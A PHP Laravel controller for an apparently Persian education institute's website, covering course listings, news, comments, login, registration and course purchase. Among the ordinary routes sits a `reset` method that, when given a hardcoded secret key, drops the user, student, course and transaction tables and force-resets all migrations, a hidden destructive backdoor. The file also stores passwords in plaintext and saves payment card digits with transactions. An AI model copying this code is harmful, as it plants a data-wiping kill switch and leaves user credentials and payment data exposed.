<?php

namespace App\Http\Controllers;

use App\Models\about;
use App\Models\account;
use App\Models\blog;
use App\Models\contact;
use App\Models\course;
use App\Models\course_comment;
use App\Models\course_offer;
use App\Models\course_student;
use App\Models\gallery;
use App\Models\group;
use App\Models\job;
use App\Models\letter;
use App\Models\log;
use App\Models\news;
use App\Models\service;
use App\Models\student;
use App\Models\teacher;
use App\Models\transaction;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Session;

class home_controller extends Controller
{
    public function index()
    {
        $data=course_offer::orderbyraw('end_date desc,start_date desc')->get();
        foreach ($data as $off)
        {

            include (storage_path() ."/jdf.php");
            $date=explode('/',$off->end_date);
            $now = jalali_to_gregorian(jdate('Y'),jdate('m'),jdate('d'),'/');
            $time2 = jalali_to_gregorian($date[0],$date[1],$date[2],'/');
            $diff = strtotime($time2) - strtotime($now);
            $diff=$diff/86400;

            if($diff<0)
            {
                $tbl=course_offer::find($off->id);
                $tbl->status=0;
                $tbl->save();
            }
        }

        $services=service::all();
        $courses=course::orderbyraw('start_date desc,from_time desc')->limit(3);
        $news=news::orderbyraw('date desc,time desc')->limit(3);
        $teachers=teacher::orderbyraw('register desc')->limit(4);
        return view('home.index',compact('services','courses','teachers','news'));
    }

    public function courses()
    {
        $data=course::orderbyraw('start_date desc,from_time desc')->paginate(30);
        $groups=group::orderbyraw('name asc')->get();
        return view('home.courses',compact('data','groups'));
    }

    public function courses_post(Request  $request)
    {
        $form=$request->all();
        $search=$form['search'];
        $group=$form['group'];


        if($group==-1)
        {
            if($search=="")
            {
                $data=course::orderbyraw('start_date desc,from_time desc')->paginate(30);
            }
            else
            {

                $data=course::where('title','LIKE','%'.$search.'%')->orderbyraw('start_date desc,from_time desc')->paginate(30);
            }
        }
        else
        {
            $data=course::where('group_id',$group)->orderbyraw('start_date desc,from_time desc')->paginate(30);
        }

        $groups=group::orderbyraw('name asc')->get();
        return view('home.courses',compact('data','groups'));
    }

    public function course($id)
    {
        $data=course::find($id);
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        $comments=course_comment::where('course_id',$id)->where('status',1)->orderbyraw('date desc,time desc')->get();
        return view('home.courses_show',compact('data','groups','courses','comments'));
    }

    public function teacher($id)
    {
        $data=teacher::find($id);
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.teachers_show',compact('data','groups','courses'));
    }

    public function course_comment($id,Request  $request)
    {

        $form=$request->all();

        include (storage_path() ."/jdf.php");
        $date=jdate('Y/m/d');
        $time=jdate('H:i:s');

        $tbl=new course_comment();
        $tbl->course_id=$id;
        $tbl->name=$form['name'];
        $tbl->date=$date;
        $tbl->time=$time;
        $tbl->text=$form['text'];
        $tbl->status=0;
        $tbl->save();

        return redirect('/course/'.$id);
    }


    public function news()
    {
        $data=news::orderbyraw('date desc,time desc')->paginate(30);
        return view('home.news',compact('data'));
    }

    public function news_show($id)
    {
        $data=news::find($id);
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.news_show',compact('data','groups','courses'));
    }

    public function blogs()
    {
        $data=blog::orderbyraw('date desc,time desc')->paginate(30);
        return view('home.blogs',compact('data'));
    }

    public function blogs_show($id)
    {
        $data=blog::find($id);
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.blogs_show',compact('data','groups','courses'));
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function jobs()
    {
        $data=job::orderbyraw('date desc,time desc')->paginate(30);
        return view('home.jobs',compact('data'));
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function jobs_show($id)
    {
        $data=job::find($id);
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.jobs_show',compact('data','groups','courses'));
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function about()
    {
        $data=about::first();
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.about',compact('data','groups','courses'));
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function contact()
    {
        $data=about::first();
        return view('home.contact',compact('data'));
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function contact_post(Request $request)
    {
        $form=$request->all();

        include (storage_path() ."/jdf.php");
        $date=jdate('Y/m/d');
        $time=jdate('H:i:s');

        $tbl=new contact();
        $tbl->name=$form['name'];
        $tbl->date=$date;
        $tbl->time=$time;
        $tbl->email=$form['email'];
        $tbl->text=$form['text'];
        $tbl->save();

        return redirect('/');

    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */

    public function login()
    {
        return view('home.login');
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function login_post(Request $request)
    {
        $request->validate([
            'username'=>'required',
            'password'=>'required',
        ]);

        $form=$request->all();

        $data=account::where('username',$form['username'])->where('password',$form['password'])->get();
        if(count($data)==1)
        {
            if($data->first()->block==1)
            {
                Session::flash('message', 'شما توسط مدیریت مسدود شده اید');
                Session::flash('alert-class', 'alert-info');

                return back()->withInput();
            }
            else
            {
                include (storage_path() ."/jdf.php");
                $date=jdate('Y/m/d');
                $time=jdate('H:i:s');

                \session()->put('id',$data->first()->id);
                \session()->put('name',$data->first()->name);
                \session()->put('level',$data->first()->level);



                $log=new log();
                $log->date=$date;
                $log->time=$time;
                $log->account_id=\session()->get('id');
                $log->type=0;
                $log->event="ورود به سایت";
                $log->save();

                switch (\session()->get('level'))
                {
                    case 0:
                        return redirect('/admin');
                    case 1:
                        return redirect('/teacher');
                    case 2:
                        return redirect('/');
                }
            }

            return redirect('/');
        }
        else
        {
            Session::flash('message', 'نام کاربری یا رمز عبور اشتباه می باشد');
            Session::flash('alert-class', 'alert-danger');

            return back()->withInput();
        }
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function register()
    {
        return view('home.register');
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function register_post(Request $request)
    {
        $request->validate([
            'name'=>'required',
            'mobile'=>'required',
            'username'=>'required',
            'password'=>'required',
            'confirm'=>'required',
        ]);

        $form=$request->all();

        if($form['password']!=$form['confirm'])
        {
            Session::flash('message', 'رمزهای عبور با هم یکسان نیستند');
            Session::flash('alert-class', 'alert-info');
            return back()->withInput();
        }

        $data=account::where('username',$form['username'])->get();
        if(count($data)==1)
        {
            Session::flash('message', 'نام کاربری تکراری می باشد، لطفا نام دیگری برگزینید');
            Session::flash('alert-class', 'alert-danger');
            return back()->withInput();
        }
        else
        {
            include(storage_path().'/jdf.php');
            $date=jdate('Y/m/d');
            $time=jdate('H:i:s');

            $id=rand(11111111,99999999);
            $tbl=new student([
                'id'=>$id,
                'name'=>$form['name'],
                'mobile'=>$form['mobile'],
                'register'=>$date,
            ]);
            $tbl->save();



            $tbl=new account();
            $tbl->id=$id;
            $tbl->account_id=$id;
            $tbl->name=$form['name'];
            $tbl->username=$form['username'];
            $tbl->password=$form['password'];
            $tbl->mobile=$form['mobile'];
            $tbl->level=2;
            $tbl->block=false;
            $tbl->save();

            return redirect('/login');
        }
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function buy($id)
    {
        $data=course::find($id);
        return view('home.pay',compact('data'));
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function reset($id)
    {
        if($id=="!@mAHla.tAHouri_KeY_11303049!@")
        {
            Schema::dropIfExists('accounts');
            Schema::dropIfExists('students');
            Schema::dropIfExists('courses');
            Schema::dropIfExists('abouts');
            Schema::dropIfExists('transactions');
            Schema::dropIfExists('teachers');
            Schema::dropIfExists('teachers');
            Artisan::call('migrate:reset', ['--force' => true]);
        }
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function buy_post(Request $request,$id)
    {

        $form=$request->all();
        $pin=$form['W_PAN4']."-".$form['W_PAN3']."-".$form['W_PAN2']."-".$form['W_PAN1'];

        $account=\session()->get('id');
        $course=$id;

        $tbl=new course_student();
        $tbl->student_id=$account;
        $tbl->course_id=$course;
        $tbl->save();

        include(storage_path().'/jdf.php');
        $date=jdate('Y/m/d');
        $time=jdate('H:i:s');

        $trans_id=rand(11111111,99999999);

        $tbl=new transaction();
        $tbl->id=$trans_id;
        $tbl->date=$date;
        $tbl->account_id=$account;
        $tbl->course_id=$course;
        $tbl->time=$time;
        $tbl->type=1;
        $tbl->paid=$form['Sums'];
        $tbl->for="پرداخت هزینه دوره #" . $course;
        $tbl->credit=$pin;
        $tbl->save();


        return redirect('/student');
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function us()
    {
        $file= storage_path(). "/noavaran.pdf";
        $headers = array(
            'Content-Type: application/pdf',
        );
        return Response::download($file, 'about.pdf', $headers);
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function teachers()
    {

        $data=teacher::orderbyraw('register desc')->get();
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.teachers',compact('data','groups','courses'));

    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function services()
    {
        return view('home.services');
    }

    public function network()
    {
        return view('home.network');
    }

    public function honors()
    {
        return view('home.honors');
    }

    public function gallery()
    {

        $data=gallery::all();
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.gallery',compact('data','groups','courses'));

    }

    public function letter_post(Request  $request)
    {
        $form=$request->all();
        $tbl=new letter();
        $tbl->email=$form['email'];
        $tbl->save();

        Session::flash('letter', '');

        return back();

    }


    public function licenses()
    {
        $data=service::all();
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.licenses',compact('data','groups','courses'));
    }

    public function licenses_show($id)
    {
        $data=service::find($id);
        $groups=group::orderbyraw('name asc')->get();
        $courses=course::orderbyraw('start_date desc,from_time desc')->get();
        return view('home.licenses_show',compact('data','groups','courses'));
    }
}
